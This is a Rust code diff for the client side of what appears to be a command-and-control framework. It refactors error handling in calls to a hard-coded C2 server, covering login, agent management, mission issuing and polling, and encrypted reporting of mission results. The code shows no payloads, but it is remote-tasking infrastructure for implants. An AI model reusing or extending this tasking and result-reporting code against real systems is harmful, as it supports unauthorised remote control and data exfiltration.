@@ -8,7 +8,7 @@ const C2_URL: &str = "http://10.211.55.2:3000";
 #[derive(Debug, Error)]
 pub enum ClientError {
     #[error("Failed to send request: {0}")]
-    Ureq(#[from] ureq::Error),
+    Ureq(#[from] Box<ureq::Error>),
     #[error("Failed to serialize data: {0}")]
     Serde(#[from] serde_json::Error),
     #[error("IO error: {0}")]
@@ -27,7 +27,9 @@ const AUTHORIZATION: &str = "Authorization";
 
 pub fn login(signing_key: &mut crypto::SigningKey) -> ClientResult<String> {
     let (_, crypto_negociation) = model::CryptoNegociation::new(signing_key);
-    let response = ureq::get(C2_URL).send_json(crypto_negociation)?;
+    let response = ureq::get(C2_URL)
+        .send_json(crypto_negociation)
+        .map_err(Box::new)?;
 
     if response.status() == 200 {
         println!("Logged in");
@@ -56,7 +58,8 @@ pub mod agents {
                 platform,
                 created_at: Default::default(),
                 last_seen_at: Default::default(),
-            })?;
+            })
+            .map_err(Box::new)?;
 
         if response.status() == 201 {
             println!("Agent created");
@@ -69,7 +72,8 @@ pub mod agents {
     pub fn get(token: &str) -> ClientResult<Vec<model::Agent>> {
         let agents: Vec<model::Agent> = ureq::get(&format!("{C2_URL}/agents"))
             .set(AUTHORIZATION, &format!("Bearer {token}"))
-            .call()?
+            .call()
+            .map_err(Box::new)?
             .into_json()?;
         Ok(agents)
     }
@@ -77,7 +81,8 @@ pub mod agents {
     pub fn update(token: &str, agent: &model::Agent) -> ClientResult<()> {
         if ureq::put(&format!("{C2_URL}/agents/{}", agent.id))
             .set(AUTHORIZATION, &format!("Bearer {token}"))
-            .send_json(agent)?
+            .send_json(agent)
+            .map_err(Box::new)?
             .status()
             == 200
         {
@@ -91,7 +96,8 @@ pub mod agents {
     pub fn delete(token: &str, agent_id: i32) -> ClientResult<()> {
         if ureq::delete(&format!("{C2_URL}/agents/{agent_id}"))
             .set(AUTHORIZATION, &format!("Bearer {token}"))
-            .call()?
+            .call()
+            .map_err(Box::new)?
             .status()
             == 200
         {
@@ -109,14 +115,15 @@ pub mod missions {
     pub fn issue(token: &str, agent_id: i32, task: model::Task) -> ClientResult<model::Mission> {
         let mission: model::Mission = ureq::post(&format!("{C2_URL}/missions"))
             .set(AUTHORIZATION, &format!("Bearer {token}"))
-            .send_json(serde_json::to_value(&model::Mission {
+            .send_json(serde_json::to_value(model::Mission {
                 id: Default::default(),
                 agent_id,
                 task,
                 result: None,
                 issued_at: Default::default(),
                 completed_at: None,
-            })?)?
+            })?)
+            .map_err(Box::new)?
             .into_json()?;
         Ok(mission)
     }
@@ -124,7 +131,8 @@ pub mod missions {
     pub fn get_result(token: &str, mission_id: i32) -> ClientResult<Option<String>> {
         let response = ureq::get(&format!("{C2_URL}/missions/{mission_id}"))
             .set(AUTHORIZATION, &format!("Bearer {token}"))
-            .call()?;
+            .call()
+            .map_err(Box::new)?;
         if response.status() == 204 {
             Ok(None)
         } else {
@@ -142,7 +150,8 @@ pub mod missions {
 
         let response = ureq::get(&format!("{C2_URL}/missions"))
             .set(crate::PLATFORM_HEADER, &crate::PLATFORM.to_string())
-            .send_json(serde_json::to_value(&crypto_negociation)?)?;
+            .send_json(serde_json::to_value(crypto_negociation)?)
+            .map_err(Box::new)?;
         if response.status() == 204 {
             log::debug!("No mission");
             return Ok(None);
@@ -167,7 +176,8 @@ pub mod missions {
         log::debug!("{result}");
         let (_, crypto_negociation) = model::CryptoNegociation::new(signing_key);
         let response = ureq::get(&format!("{C2_URL}/crypto/{}", mission.id))
-            .send_json(serde_json::to_value(&crypto_negociation)?)?;
+            .send_json(serde_json::to_value(crypto_negociation)?)
+            .map_err(Box::new)?;
 
         if response.status() != 200 {
             log::error!("Failed to get crypto negociation");
@@ -180,11 +190,12 @@ pub mod missions {
 
         let response = ureq::put(&format!("{C2_URL}/missions/{}", mission.id))
             .set(crate::PLATFORM_HEADER, &crate::PLATFORM.to_string())
-            .send_json(serde_json::to_value(&model::CryptoMessage::new(
+            .send_json(serde_json::to_value(model::CryptoMessage::new(
                 signing_key,
                 crypto_negociation.public_key,
                 result.as_bytes(),
-            )?)?)?;
+            )?)?)
+            .map_err(Box::new)?;
 
         if response.status() != 202 {
             log::error!("Failed to report mission [{}]: {:#?}", mission.id, response);
